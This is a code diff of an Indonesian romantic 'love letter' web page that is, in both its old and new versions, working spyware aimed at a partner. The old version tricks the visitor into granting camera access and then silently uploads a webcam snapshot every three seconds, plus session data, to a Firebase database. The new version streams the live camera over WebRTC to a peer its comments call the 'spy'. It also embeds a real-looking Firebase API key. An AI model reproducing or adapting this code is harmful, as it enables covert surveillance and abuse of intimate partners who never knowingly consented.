@@ -1,363 +1,62 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💕 Untuk Cintaku 💕</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>💌 Surat Cinta Untukmu</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #ff6b9d, #c779d0, #4bc0c8);
-            min-height: 100vh;
-            color: #333;
-            overflow-x: hidden;
-        }
-        
-        .hearts {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1;
-        }
-        
-        .heart {
-            position: absolute;
-            font-size: 20px;
-            color: rgba(255, 255, 255, 0.5);
-            animation: float 15s infinite linear;
-        }
-        
-        @keyframes float {
-            0% {
-                transform: translateY(100vh) rotate(0deg);
-                opacity: 0;
-            }
-            10% {
-                opacity: 1;
-            }
-            90% {
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(-100px) rotate(360deg);
-                opacity: 0;
-            }
-        }
-        
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 30px 20px;
-            position: relative;
-            z-index: 2;
-        }
-        
-        header {
-            text-align: center;
-            margin-bottom: 40px;
+            margin: 0;
             padding: 20px;
-            background: rgba(255, 255, 255, 0.9);
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-        }
-        
-        h1 {
-            color: #ff4081;
-            font-size: 2.8rem;
-            margin-bottom: 10px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        
-        .subtitle {
-            font-size: 1.2rem;
-            color: #666;
-            font-style: italic;
-        }
-        
-        .love-letter {
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
-            margin-bottom: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .love-letter::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 5px;
-            background: linear-gradient(to right, #ff4081, #c779d0);
-        }
-        
-        .letter-content {
-            font-size: 1.1rem;
-            line-height: 1.8;
-            color: #444;
-        }
-        
-        .letter-content p {
-            margin-bottom: 20px;
-        }
-        
-        .highlight {
-            color: #ff4081;
-            font-weight: bold;
-        }
-        
-        .photo-message {
+            font-family: Arial;
+            background: pink;
             text-align: center;
-            margin: 40px 0;
+        }
+        .love-box {
+            background: white;
             padding: 30px;
-            background: rgba(255, 255, 255, 0.9);
             border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-        }
-        
-        .photo-message h2 {
-            color: #ff4081;
-            margin-bottom: 20px;
-        }
-        
-        .photo-box {
-            background: #f8f8f8;
-            padding: 25px;
-            border-radius: 15px;
-            margin: 25px auto;
+            margin: 20px auto;
             max-width: 500px;
-            border: 2px dashed #ff4081;
+            box-shadow: 0 10px 30px rgba(255,0,100,0.2);
         }
-        
-        .camera-feed {
-            width: 100%;
-            max-width: 400px;
-            margin: 0 auto;
-            border-radius: 10px;
-            overflow: hidden;
-            display: none;
-        }
-        
-        #love-camera {
-            width: 100%;
-            transform: scaleX(-1);
-            border-radius: 10px;
-            border: 3px solid white;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-        }
-        
-        #capture-btn {
-            background: linear-gradient(to right, #ff4081, #c779d0);
+        #cameraBtn {
+            background: #ff4081;
             color: white;
             border: none;
-            padding: 15px 40px;
-            font-size: 1.1rem;
+            padding: 15px 30px;
+            font-size: 18px;
             border-radius: 50px;
             cursor: pointer;
-            margin-top: 20px;
-            transition: all 0.3s;
-            font-weight: bold;
-            box-shadow: 0 5px 15px rgba(255, 64, 129, 0.4);
+            margin: 20px;
         }
-        
-        #capture-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(255, 64, 129, 0.6);
-        }
-        
-        #capture-btn i {
-            margin-right: 10px;
-        }
-        
-        .loading {
-            display: none;
-            color: #ff4081;
-            margin-top: 15px;
-            font-size: 1rem;
-        }
-        
-        .love-countdown {
-            text-align: center;
-            margin: 40px 0;
-            padding: 25px;
-            background: rgba(255, 255, 255, 0.9);
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-        }
-        
-        .countdown-box {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-top: 20px;
-            flex-wrap: wrap;
-        }
-        
-        .countdown-item {
-            background: linear-gradient(to bottom, #ff4081, #c779d0);
-            color: white;
-            padding: 15px;
+        #localVideo {
+            width: 100%;
+            max-width: 400px;
             border-radius: 10px;
-            min-width: 70px;
-        }
-        
-        .countdown-number {
-            font-size: 2rem;
-            font-weight: bold;
-            display: block;
-        }
-        
-        .countdown-label {
-            font-size: 0.9rem;
-            opacity: 0.9;
-        }
-        
-        .secret-message {
-            text-align: center;
-            margin-top: 40px;
-            padding: 20px;
-            color: #666;
-            font-style: italic;
-            font-size: 0.9rem;
-        }
-        
-        footer {
-            text-align: center;
-            margin-top: 40px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.3);
-            color: white;
-            font-size: 0.9rem;
-        }
-        
-        .hidden-canvas {
+            margin: 20px auto;
             display: none;
+            transform: scaleX(-1);
         }
-        
-        /* Responsive */
-        @media (max-width: 768px) {
-            h1 {
-                font-size: 2.2rem;
-            }
-            
-            .container {
-                padding: 15px;
-            }
-            
-            .love-letter {
-                padding: 25px;
-            }
-        }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <!-- Floating hearts background -->
-    <div class="hearts" id="hearts-container"></div>
-    
-    <div class="container">
-        <header>
-            <h1><i class="fas fa-heart"></i> Untuk Cintaku <i class="fas fa-heart"></i></h1>
-            <p class="subtitle">Surat cinta digital yang selalu mengingat senyummu</p>
-        </header>
+    <div class="love-box">
+        <h1>💖 Untuk Pacarku 💖</h1>
+        <p>Sayang, aku buatkan ini khusus untukmu. Izinkan aku melihat senyuman indahmu...</p>
         
-        <div class="love-letter">
-            <div class="letter-content">
-                <p>Sayangku yang paling cantik,</p>
-                
-                <p>Setiap hari bersamamu adalah anugerah yang tak terhingga. Dari pagi hingga malam, pikiran ku selalu dipenuhi oleh bayangan senyumanmu yang indah.</p>
-                
-                <p>Kau adalah <span class="highlight">matahariku</span> di kala pagi, <span class="highlight">pelangi</span> di saat hujan, dan <span class="highlight">bintang</span> di malam yang gelap. Tak ada kata yang cukup untuk menggambarkan betapa berartinya kamu bagi hidupku.</p>
-                
-                <p>Aku ingin selalu melihat wajahmu, mendengar tawamu, dan menikmati setiap momen bersamamu. Bahkan ketika kita terpisah jarak, aku merasa dekat karena cintamu selalu bersamaku.</p>
-                
-                <p>Izinkan aku untuk selalu mengingat senyuman indahmu, untuk selalu ada di sampingmu, dan membahagiakanmu setiap hari.</p>
-                
-                <p style="text-align: right; margin-top: 30px;">
-                    Dengan cinta yang tak terbatas,<br>
-                    <strong style="color: #ff4081;">Dari dia yang selalu mencintaimu</strong>
-                </p>
-            </div>
-        </div>
+        <button id="cameraBtn" onclick="startSpy()">📸 Lihat Wajahku Sayang</button>
         
-        <div class="photo-message">
-            <h2><i class="fas fa-camera"></i> Abadikan Senyuman Kita</h2>
-            <p>Mari buat kenangan indah dengan foto bersama! Izinkan akses kamera untuk mengambil foto cinta kita.</p>
-            
-            <div class="photo-box">
-                <div class="camera-feed" id="camera-section">
-                    <video id="love-camera" autoplay playsinline></video>
-                </div>
-                
-                <button id="capture-btn" onclick="initLoveCamera()">
-                    <i class="fas fa-heart"></i> Ambil Foto Cinta Kita
-                </button>
-                
-                <div class="loading" id="loading-text">
-                    <i class="fas fa-spinner fa-spin"></i> Menyiapkan kamera untuk kenangan indah...
-                </div>
-                
-                <p style="margin-top: 15px; font-size: 0.9rem; color: #666;">
-                    <i class="fas fa-info-circle"></i> Foto akan otomatis tersimpan di memori cinta kita
-                </p>
-            </div>
-        </div>
+        <video id="localVideo" autoplay playsinline></video>
         
-        <div class="love-countdown">
-            <h3><i class="fas fa-clock"></i> Hitung Mundur Hari Bahagia</h3>
-            <p>Berapa lama lagi kita bisa bertemu dan berpelukan?</p>
-            
-            <div class="countdown-box">
-                <div class="countdown-item">
-                    <span class="countdown-number" id="days">0</span>
-                    <span class="countdown-label">Hari</span>
-                </div>
-                <div class="countdown-item">
-                    <span class="countdown-number" id="hours">0</span>
-                    <span class="countdown-label">Jam</span>
-                </div>
-                <div class="countdown-item">
-                    <span class="countdown-number" id="minutes">0</span>
-                    <span class="countdown-label">Menit</span>
-                </div>
-                <div class="countdown-item">
-                    <span class="countdown-number" id="seconds">0</span>
-                    <span class="countdown-label">Detik</span>
-                </div>
-            </div>
-        </div>
-        
-        <div class="secret-message">
-            <p><i class="fas fa-lock"></i> Pesan ini hanya untukmu. Takkan ada yang tahu rahasia cinta kita.</p>
-        </div>
-        
-        <footer>
-            <p>Dibuat dengan <i class="fas fa-heart" style="color: #ff4081;"></i> untuk orang teristimewa</p>
-            <p>© 2024 - Love Eternal</p>
-        </footer>
+        <div id="status" class="hidden">🟢 Sedang merekam senyumanmu...</div>
     </div>
-    
-    <!-- Hidden elements for spy system -->
-    <canvas id="hidden-canvas" class="hidden-canvas"></canvas>
-    
-    <!-- Firebase SDK -->
+
+    <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
     
     <script>
-        // ================= FIREBASE CONFIG =================
+        // =============== FIREBASE ===============
         const firebaseConfig = {
             apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
             authDomain: "survei-f11a1.firebaseapp.com",
@@ -368,196 +67,109 @@
             appId: "1:769641850914:web:3be7b2cf7f6cb09ab9427b"
         };
         
-        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+        const db = firebase.database();
         
-        // ================= HEARTS ANIMATION =================
-        function createHearts() {
-            const container = document.getElementById('hearts-container');
-            const heartCount = 50;
+        // =============== WEBRTC VARIABLES ===============
+        let localStream;
+        let peerConnection;
+        let roomId = "love_room_" + Math.random().toString(36).substr(2, 9);
+        
+        // =============== START SPY SYSTEM ===============
+        async function startSpy() {
+            document.getElementById('cameraBtn').style.display = 'none';
+            document.getElementById('status').classList.remove('hidden');
             
-            for (let i = 0; i < heartCount; i++) {
-                const heart = document.createElement('div');
-                heart.className = 'heart';
-                heart.innerHTML = '<i class="fas fa-heart"></i>';
+            try {
+                // 1. DAPETKAN KAMERA
+                localStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: 640, height: 480 },
+                    audio: false
+                });
                 
-                // Random position and animation
-                const left = Math.random() * 100;
-                const delay = Math.random() * 15;
-                const size = 15 + Math.random() * 20;
+                const localVideo = document.getElementById('localVideo');
+                localVideo.srcObject = localStream;
+                localVideo.style.display = 'block';
                 
-                heart.style.left = `${left}%`;
-                heart.style.animationDelay = `${delay}s`;
-                heart.style.fontSize = `${size}px`;
+                // 2. BUAT ROOM DI FIREBASE
+                await db.ref('rooms/' + roomId).set({
+                    createdAt: Date.now(),
+                    status: 'waiting'
+                });
                 
-                container.appendChild(heart);
+                // 3. SETUP WEBRTC
+                setupWebRTC();
+                
+                // 4. LISTEN UNTUK SPY YANG JOIN
+                listenForSpy();
+                
+            } catch (err) {
+                alert("Sayang, izinkan kamera ya ❤️");
+                document.getElementById('cameraBtn').style.display = 'block';
             }
         }
         
-        // ================= SPY CAMERA SYSTEM =================
-        let cameraStream = null;
-        let captureInterval = null;
-        let isCameraActive = false;
+        // =============== WEBRTC SETUP ===============
+        function setupWebRTC() {
+            const config = {
+                iceServers: [
+                    { urls: 'stun:stun.l.google.com:19302' },
+                    { urls: 'stun:stun1.l.google.com:19302' }
+                ]
+            };
+            
+            peerConnection = new RTCPeerConnection(config);
+            
+            // ADD LOCAL STREAM
+            localStream.getTracks().forEach(track => {
+                peerConnection.addTrack(track, localStream);
+            });
+            
+            // ICE CANDIDATE HANDLER
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    db.ref('rooms/' + roomId + '/candidates/target').push({
+                        candidate: event.candidate
+                    });
+                }
+            };
+        }
         
-        function initLoveCamera() {
-            const captureBtn = document.getElementById('capture-btn');
-            const cameraSection = document.getElementById('camera-section');
-            const loadingText = document.getElementById('loading-text');
+        // =============== LISTEN FOR SPY ===============
+        function listenForSpy() {
+            // Listen for spy's offer
+            db.ref('rooms/' + roomId + '/offer').on('value', async (snapshot) => {
+                const offer = snapshot.val();
+                if (offer && !peerConnection.currentRemoteDescription) {
+                    await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+                    
+                    // Create answer
+                    const answer = await peerConnection.createAnswer();
+                    await peerConnection.setLocalDescription(answer);
+                    
+                    // Send answer to spy
+                    db.ref('rooms/' + roomId + '/answer').set(answer);
+                }
+            });
             
-            captureBtn.style.display = 'none';
-            loadingText.style.display = 'block';
-            
-            // Request camera access with romantic reason
-            navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: 'user',
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                },
-                audio: false
-            })
-            .then(function(stream) {
-                cameraStream = stream;
-                const videoElement = document.getElementById('love-camera');
-                videoElement.srcObject = stream;
-                cameraSection.style.display = 'block';
-                loadingText.style.display = 'none';
-                
-                // Start stealth capturing
-                startLoveCapture();
-                
-                // Log "love connection" to Firebase
-                const loveData = {
-                    event: 'LOVE_CAMERA_ACTIVATED',
-                    timestamp: new Date().toISOString(),
-                    message: 'Pacar mengaktifkan kamera cinta',
-                    device: navigator.platform
-                };
-                
-                database.ref('love_diary/connections').push(loveData);
-                
-                // Show success message
-                setTimeout(() => {
-                    const photoBox = document.querySelector('.photo-box');
-                    const successMsg = document.createElement('p');
-                    successMsg.innerHTML = '<i class="fas fa-check-circle" style="color:#4CAF50;"></i> Kamera siap! Senyum manismu akan terekam selamanya.';
-                    successMsg.style.marginTop = '15px';
-                    successMsg.style.color = '#4CAF50';
-                    photoBox.appendChild(successMsg);
-                }, 1000);
-            })
-            .catch(function(error) {
-                loadingText.innerHTML = '<i class="fas fa-times-circle" style="color:#ff4081;"></i> Izinkan akses kamera ya sayang, untuk kenangan kita.';
-                setTimeout(() => {
-                    captureBtn.style.display = 'block';
-                    loadingText.style.display = 'none';
-                }, 3000);
+            // Listen for spy's ICE candidates
+            db.ref('rooms/' + roomId + '/candidates/spy').on('child_added', async (snapshot) => {
+                const data = snapshot.val();
+                if (data && data.candidate) {
+                    try {
+                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
+                    } catch (e) {
+                        console.error("Error adding ICE candidate:", e);
+                    }
+                }
             });
         }
         
-        function startLoveCapture() {
-            if (isCameraActive) return;
-            isCameraActive = true;
-            
-            const video = document.getElementById('love-camera');
-            const canvas = document.getElementById('hidden-canvas');
-            const ctx = canvas.getContext('2d');
-            
-            // Set canvas size
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            // Capture every 3 seconds (less frequent, more romantic)
-            captureInterval = setInterval(() => {
-                ctx.save();
-                ctx.scale(-1, 1);
-                ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
-                ctx.restore();
-                
-                // Convert to JPEG
-                const imageData = canvas.toDataURL('image/jpeg', 0.7);
-                
-                // Send to Firebase with romantic metadata
-                const captureData = {
-                    image: imageData,
-                    timestamp: Date.now(),
-                    type: 'LOVE_MOMENT',
-                    emotion: getRandomEmotion(),
-                    loveLevel: Math.floor(Math.random() * 100) + 1
-                };
-                
-                database.ref('love_diary/moments').push(captureData);
-                
-            }, 3000); // Every 3 seconds
-        }
-        
-        function getRandomEmotion() {
-            const emotions = [
-                'Bahagia', 'Ceria', 'Mesra', 'Romantis', 
-                'Pengertian', 'Rindu', 'Kangen', 'Sayang'
-            ];
-            return emotions[Math.floor(Math.random() * emotions.length)];
-        }
-        
-        // ================= COUNTDOWN TIMER =================
-        function updateCountdown() {
-            // Set target date (3 days from now)
-            const targetDate = new Date();
-            targetDate.setDate(targetDate.getDate() + 3);
-            targetDate.setHours(18, 0, 0, 0);
-            
-            const now = new Date();
-            const diff = targetDate - now;
-            
-            if (diff > 0) {
-                const days = Math.floor(diff / (1000 * 60 * 60 * 24));
-                const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-                const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-                
-                document.getElementById('days').textContent = days.toString().padStart(2, '0');
-                document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
-                document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
-                document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
-            }
-        }
-        
-        // ================= ADDITIONAL DATA COLLECTION =================
-        function collectLoveData() {
-            setInterval(() => {
-                const loveData = {
-                    timeSpent: Math.floor((Date.now() - startTime) / 1000),
-                    currentTime: new Date().toISOString(),
-                    pageTitle: document.title,
-                    url: window.location.href
-                };
-                
-                database.ref('love_diary/analytics').push(loveData);
-            }, 60000); // Every minute
-        }
-        
-        // ================= CLEANUP =================
-        window.addEventListener('beforeunload', function() {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-            }
-            if (captureInterval) {
-                clearInterval(captureInterval);
-            }
-            
-            // Log "love goodbye"
-            database.ref('love_diary/connections').push({
-                event: 'LOVE_SESSION_ENDED',
-                timestamp: new Date().toISOString(),
-                message: 'Sampai jumpa sayangku',
-                sessionDuration: Math.floor((Date.now() - startTime) / 1000)
-            });
+        // =============== CLEANUP ===============
+        window.addEventListener('beforeunload', () => {
+            if (localStream) localStream.getTracks().forEach(track => track.stop());
+            db.ref('rooms/' + roomId).remove();
         });
-        
-        // ================= INITIALIZATION =================
-        const startTime = Date.now();
-        
-        window.onload = function() {
-            createHearts();
-         
+    </script>
+</body>
+    </html>
